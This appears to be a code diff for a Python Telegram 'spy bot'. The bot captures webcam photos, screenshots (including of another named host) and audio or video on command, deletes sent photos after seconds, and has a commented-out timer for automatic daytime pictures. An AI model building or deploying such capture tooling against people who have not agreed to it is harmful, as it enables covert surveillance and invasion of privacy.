@@ -1,7 +1,7 @@
 from utils import * 
 from telebot import TeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import logging
+import logging, shutil,datetime
 from mega import Mega 
 
 
@@ -11,8 +11,7 @@ from mega import Mega
 
 TOKEN = os.getenv('TOKEN')
 ALLOWED_USERS = [int(i) for i in os.getenv('ALLOWED_USERS').split()]  
-ADMIN = int(os.getenv('ADMIN'))
-user,pasw,MEGA_FOLDER = os.getenv('MEGA').split(',')
+ADMIN = os.getenv('ADMIN')
 
 
 
@@ -21,9 +20,8 @@ bot = TeleBot(TOKEN, parse_mode='HTML')
 
 
 # remind the user when a long recording in progress
-# Assumed there wont be any simultaneous recording from multiple users
 class Reminder:
-    def __init__(self, timeOut=10 * 60):
+    def __init__(self, timeOut=3 * 60):
         self.timeOut = timeOut  # interval to notify the user, 10 minute default
         self.timer: Timer
         self.userid: int = 0
@@ -35,7 +33,7 @@ class Reminder:
 
     def nudge(self):
         message = bot.send_message(self.userid, "Recording in progress. Don't forget to finish")
-        deleteMessage(message,30) # delete this notification after 10 seconds
+        deleteMessage(message,60) # delete this notification after 10 seconds
 
     def cancel(self):
         self.timer.cancel()
@@ -45,11 +43,25 @@ recorder = AVRecorder()
 remind = Reminder()
 
 
+
+
+def myPic():
+    if datetime.time(9,0,0) <= datetime.datetime.now().time() <= datetime.time(21,0,0): 
+        recorder.takePicture()
+# take a picture every 30 minutes 
+# myTimer = RepeatTimer(3*60,myPic)
+# myTimer.start()
+
+
+
+
+
+
 def deleteMessage(message, delay=0):
-    # delete a message, optionally define a time delay for the delete
+    # delete a message, optionally define a delay for the delete
     def tempDelete(message):
         bot.delete_message(message.chat.id, message.message_id)
-    if delay: # delay non zero means delete some times later
+    if delay: # dely non zero means delete some times later
         Timer(delay,tempDelete,[message]).start()
     else:
         tempDelete(message)
@@ -90,6 +102,64 @@ def send_welcome(message):
     bot.send_message(message.from_user.id, "Welcome to the spy bot")
 
 
+@bot.message_handler(commands=['screen2'])
+def send_screen_other(message):
+    hostOther = message.text.strip('/screen2')
+    user = message.from_user.id
+    if checkRequest(message):
+        return
+
+
+    waitM = bot.send_message(user, "Wait while the bot takes the photo")
+    file = takeScreenShot(hostOther)
+
+    if not file:
+        bot.send_message(user, "Device is busy. Can't capture photo.")
+        bot.delete_message(waitM.chat.id, waitM.message_id)
+        return
+
+
+    ranStr = getRandomString()
+
+    with open(file, 'rb') as f:
+        try:
+            photoM = bot.send_photo(user, f, caption="This photo will be deleted after 10 seconds.", 
+                reply_markup=photoMarkup(ranStr))
+        except Exception as e:
+            logger.info(e)
+
+    photoK.queueToDelete(message, photoM, ranStr)
+    bot.delete_message(waitM.chat.id, waitM.message_id)
+
+
+@bot.message_handler(commands=['screen'])
+def send_screen(message):
+    user = message.from_user.id
+    if checkRequest(message):
+        return
+
+
+    waitM = bot.send_message(user, "Wait while the bot takes the photo")
+    file = takeScreenShot()
+    if not file:
+        bot.send_message(user, "Device is busy. Can't capture photo.")
+        bot.delete_message(waitM.chat.id, waitM.message_id)
+        return
+
+
+    ranStr = getRandomString()
+
+    with open(file, 'rb') as f:
+        try:
+            photoM = bot.send_photo(user, f, caption="This photo will be deleted after 10 seconds.", 
+                reply_markup=photoMarkup(ranStr))
+        except Exception as e:
+            logger.info(e)
+    
+    photoK.queueToDelete(message, photoM, ranStr)
+    bot.delete_message(waitM.chat.id, waitM.message_id)
+
+
 
 @bot.message_handler(commands=['photo'])
 def send_photo(message):
@@ -98,7 +168,7 @@ def send_photo(message):
         return
 
     if recorder.isRunning:
-        bot.send_message(user, "Recording in Progress. Can't capture photo.")
+        bot.send_message(user, "Device is busy. Can't capture photo.")
         return
 
     waitM = bot.send_message(user, "Wait while the bot takes the photo")
@@ -115,14 +185,14 @@ def send_photo(message):
         try:
             photoM = bot.send_photo(user, f, caption="This photo will be deleted after 10 seconds.", 
                 reply_markup=photoMarkup(ranStr))
-            photoK.queueToDelete(message, photoM, ranStr)
         except Exception as e:
             logger.info(e)
     
+    photoK.queueToDelete(message, photoM, ranStr)
     bot.delete_message(waitM.chat.id, waitM.message_id)
 
 
-def photoMarkup(ranStr: str):
+def photoMarkup(ranStr:str):
     markup = InlineKeyboardMarkup()
     markup.row_width = 1
     markup.add(InlineKeyboardButton("Keep this photo", callback_data="cb_keep_photo"+ranStr))
@@ -145,17 +215,36 @@ class PhotoKeeper():
         timer = Timer(self.delay, self.tmpDelete,[commandM, photoM])
         self.store[ranStr] = {
             'timer': timer,
-            'photoM': photoM
+            'photoM':photoM
         }
         timer.start()
-
+        
     def keepPhoto(self,ranStr):
         self.store[ranStr]['timer'].cancel()
         photoM = self.store[ranStr]['photoM']
-        bot.edit_message_caption("",photoM.chat.id, photoM.message_id, reply_markup=None)
+        bot.edit_message_caption("",photoM.chat.id, photoM.message_id,reply_markup=None)
 
 
 photoK = PhotoKeeper()
+
+
+# @bot.message_handler(commands=['audio'])
+# def send_audio(message):
+#     # start audio recording
+#     user = message.from_user.id
+#     if checkRequest(message):
+#         return
+
+#     if recorder.isRunning:
+#         bot.send_message(user, "Recording already in progress.")
+#     else:
+#         ret = recorder.startAudeoRec()
+#         if ret:
+#             bot.send_message(user, "Device is busy. Can't record.")
+#         else:
+#             bot.send_message(user, "Recording in progress.", reply_markup=mediaMarkup())
+#             remind.remind(user)
+
 
 
 @bot.message_handler(commands=['video','audio'])
@@ -243,5 +332,6 @@ def callback_query(call):
 
 bot.send_message(ADMIN, "Starting bot")
 mega = Mega()
+user,pasw,MEGA_FOLDER = os.getenv('MEGA').split(',')
 mClient = mega.login(user,pasw)
 bot.infinity_polling()
